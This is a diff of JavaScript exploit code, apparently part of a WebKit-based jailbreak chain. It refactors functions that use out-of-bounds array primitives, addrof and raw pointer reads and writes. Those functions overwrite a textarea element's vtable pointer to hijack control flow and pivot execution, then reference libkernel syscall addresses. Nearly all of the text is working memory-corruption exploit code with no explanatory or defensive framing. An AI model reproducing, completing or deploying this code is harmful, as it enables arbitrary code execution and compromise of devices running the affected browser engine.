@@ -62,8 +62,9 @@ function read_mem_as_string(p, sz)
 
 function write_mem(p, data)
 {
-    i48_put(p, oob_master);
-    oob_master[6] = data.length;
+    // i48_put(p, oob_master);
+    // oob_master[6] = data.length;
+    read_mem_setup(p, data.length);
     for(var i = 0; i < data.length; i++)
         oob_slave[i] = data[i];
 };
@@ -95,9 +96,9 @@ function malloc(sz)
     malloc_nogc.push(arr);
     return read_ptr_at(addrof(arr)+0x10);
 };
-window.tarea = document.createElement('textarea');
+var tarea = document.createElement('textarea');
 
-var real_vt_ptr = read_ptr_at(addrof(window.tarea)+0x18);
+var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
 var fake_vt_ptr = malloc(0x400);
 write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
 
@@ -143,19 +144,19 @@ async function pivot(buf)
 {
     var ans = malloc(0x400);
     await write_ptr_at(fake_vtable+0x1d8, saveall_addr);
-    await write_ptr_at(addrof(window.tarea)+0x18, fake_vt_ptr);
-    window.tarea.scrollLeft = 0;
-    await write_ptr_at(addrof(window.tarea)+0x18, real_vt_ptr);
+    await write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
+    tarea.scrollLeft = 0;
+    await write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
     await write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     await write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
     await write_ptr_at(fake_vtable+0x1d8, pivot_addr);
     await write_ptr_at(fake_vt_ptr+0x38, buf);
     await write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
     await write_ptr_at(buf, ans);
-    await write_ptr_at(addrof(window.tarea)+0x18, fake_vt_ptr);
-    window.tarea.scrollLeft = 0;
-    await write_ptr_at(addrof(window.tarea)+0x18, real_vt_ptr);
-    await write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+    await write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
+    tarea.scrollLeft = 0;
+    await write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
+    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
 };
 var sys_670_addr = libkernel_base + 0x1efc0;
 var sys_192_addr = libkernel_base + 0x1efe0;
